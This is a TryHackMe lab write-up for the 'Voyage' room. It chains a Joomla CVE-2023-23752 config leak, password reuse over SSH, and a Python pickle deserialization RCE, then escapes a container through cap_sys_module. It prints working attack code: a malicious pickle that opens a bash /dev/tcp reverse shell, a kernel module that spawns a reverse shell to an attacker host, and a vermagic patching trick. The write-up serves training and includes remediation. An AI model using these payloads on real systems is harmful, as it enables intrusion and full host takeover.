# Voyage — TryHackMe Writeup

> **Room:** [Voyage](https://tryhackme.com/room/voyage) · **Difficulty:** MAX (Hard)
> **Category:** Web / Boot2Root (Joomla → container pivots → kernel-module escape)
> **Author of writeup:** 0xnyx
> **Goal:** Chain multiple vulnerabilities — "get root quickly, but is it the real root or just a container?"

> ⚠️ In line with TryHackMe's write-up policy, **no flags, passwords, or cracked values are included** — only the method.

---

## How to read this writeup

Each step is **Do** → **You get** → **Why / what next**. The chain is a 4-hop pivot:

`Joomla info-leak → password reuse (container 1 root) → pickle RCE (container 2 root, user flag) → cap_sys_module kernel module (host root)`

---

## Step 1 — Port scan

**Do**

```bash
nmap -sVC -T4 -Pn <TARGET>
```

**You get**

```
22/tcp   open  ssh   OpenSSH 9.6p1 Ubuntu    <- the HOST (Ubuntu 24.04)
80/tcp   open  http  Apache ... Joomla! CMS
2222/tcp open  ssh   OpenSSH 8.2p1 Ubuntu    <- different version = a CONTAINER's SSH
```

**Why / what next** — Two SSH services with **different OpenSSH versions** is the tell: port 2222 belongs to a **container**, port 22 to the host. The web app is **Joomla**, so start there.

---

## Step 2 — Joomla info disclosure (CVE-2023-23752)

**Do** — Joomla 4.0–4.2.7 exposes its config to an unauthenticated API request.

```bash
curl -s http://<TARGET>/administrator/manifests/files/joomla.xml | grep '<version>'
curl -s "http://<TARGET>/api/index.php/v1/config/application?public=true" | python3 -m json.tool
curl -s "http://<TARGET>/api/index.php/v1/users?public=true" | python3 -m json.tool
```

**You get** — Version **4.2.7** (vulnerable) and the database config in cleartext: `user`, **`password`**, db name, prefix; plus the Super User's username.

**Why / what next** — MySQL is bound to localhost (not reachable externally), so the DB creds aren't directly usable there — but passwords get **reused**. Try the DB password against the exposed SSH.

---

## Step 3 — Password reuse → container 1 root

**Do**

```bash
sshpass -p '<DB_PASSWORD>' ssh -o StrictHostKeyChecking=no root@<TARGET> -p 2222 id
# uid=0(root) ...
ssh root@<TARGET> -p 2222        # interactive
```

**You get** — Root on a host like `root@<12-hex>` with `/.dockerenv` and an overlay filesystem → a **Docker container** (not the real host). No flag here.

**Why / what next** — This is the room's hint ("real root or just a container?"). Enumerate the container network for the next hop.

```bash
ip a                              # eth0 = 192.168.100.10/24
nmap -p 5000 --open 192.168.100.0/24
# -> 192.168.100.12 (another container) has port 5000
```

---

## Step 4 — Pivot to container 2 (pickle deserialization RCE)

**Do** — Container `.12` runs a Flask "Finance Panel" on port 5000 whose session cookie is a **hex-encoded Python pickle**:

```bash
curl -s -i http://192.168.100.12:5000/ -X POST -d "username=admin&password=admin" | grep -i set-cookie
# Set-Cookie: session_data=<hex pickle of {'user':'admin',...}>
```

**You get** — The server **unpickles** `session_data` on every request → unsafe deserialization → RCE via a crafted pickle. The reverse shell targets **container 1** (`.10`, same Docker net), where you run a listener (`socat - TCP-LISTEN:4444`).

```bash
# generate a malicious pickle (run from container 1, which has python3):
cat > /tmp/x.py <<'EOF'
import pickle, os, binascii
class E:
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/192.168.100.10/4444 0>&1'",))
print(binascii.hexlify(pickle.dumps(E())).decode())
EOF
HEX=$(python3 /tmp/x.py)
curl -s http://192.168.100.12:5000/ -H "Cookie: session_data=$HEX" -o /dev/null
```

**You get** — A shell as **root in container 2** (`d...`), where the **user flag** lives in `/root/user.txt`.

---

## Step 5 — Host escape (cap_sys_module kernel module)

**Do** — Check the second container's capabilities.

```bash
capsh --print | grep -o cap_sys_module
which gcc make; uname -r; ls /lib/modules/
```

**You get** — **`cap_sys_module`** is present (plus `gcc`/`make`). That capability lets the container **load kernel modules into the host kernel** — a full escape.

**Why / what next** — Build a kernel module whose init runs a reverse shell as root (via `call_usermodehelper`), load it, and the shell fires on the **host**.

```c
// revshell.c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kmod.h>
MODULE_LICENSE("GPL");
static int start(void){
  char *argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/<ATTACKER>/<PORT> 0>&1",NULL};
  static char *env[] = {"HOME=/","TERM=linux","PATH=/sbin:/bin:/usr/sbin:/usr/bin",NULL};
  return call_usermodehelper(argv[0],argv,env,UMH_WAIT_PROC);
}
static int __init m_init(void){return start();}
static void __exit m_exit(void){}
module_init(m_init);
module_exit(m_exit);
```

```bash
# Makefile (build against the available headers dir):
printf 'obj-m += revshell.o\nKDIR := /lib/modules/<HEADERS_VERSION>/build\nall:\n\tmake -C $(KDIR) M=$(PWD) modules\n' > Makefile
make
```

> **Gotcha — vermagic mismatch:** if the running kernel (`uname -r`) differs from the only installed headers, `insmod` fails on version magic. Patch the `.ko`'s vermagic string to the running kernel (same-length byte replace) before loading:
> ```bash
> python3 -c "d=open('revshell.ko','rb').read(); open('revshell.ko','wb').write(d.replace(b'<HEADERS_VERSION>',b'<RUNNING_KERNEL>'))"
> ```

```bash
# listener on your box:  nc -lvnp <PORT>
insmod revshell.ko
```

**You get** — A reverse shell as **root on the real host** (`root@ip-...`, no `.dockerenv`). The **root flag** is in the host's `/root/`. Box fully owned. 🏁

---

## The full chain at a glance

| Step | Technique | Result |
|------|-----------|--------|
| 1 | nmap | Two SSH versions → a container on :2222 |
| 2 | Joomla CVE-2023-23752 | DB password (cleartext) |
| 3 | Password reuse → SSH :2222 | Root in container 1 |
| 4 | Pickle deserialization RCE | Root in container 2 (user flag) |
| 5 | `cap_sys_module` kernel module | Root on the host (root flag) |

## Lessons

- Two SSH services with different versions → one is almost certainly a **container**; getting root there isn't the end.
- Joomla **4.0–4.2.7** → CVE-2023-23752 (unauthenticated config/user disclosure). Always test password reuse.
- A session cookie that is a **hex pickle** → unsafe `pickle.loads` → RCE via `__reduce__`.
- On a container network, point your reverse shell at a **reachable** host (another container / the gateway).
- **`cap_sys_module`** = container escape: load a kernel module (`call_usermodehelper`) to run code on the host. Patch vermagic if headers don't match the running kernel.

## Remediation

- Patch Joomla (≥ 4.2.8) and restrict the `/api` config endpoint.
- Never reuse the DB password for SSH; disable password SSH on containers.
- Never `pickle.loads` untrusted data — use a signed/opaque session format.
- Drop `cap_sys_module` (and all unneeded capabilities) from containers; don't run them privileged.

---

*Write-up for [TryHackMe — Voyage](https://tryhackme.com/room/voyage).*
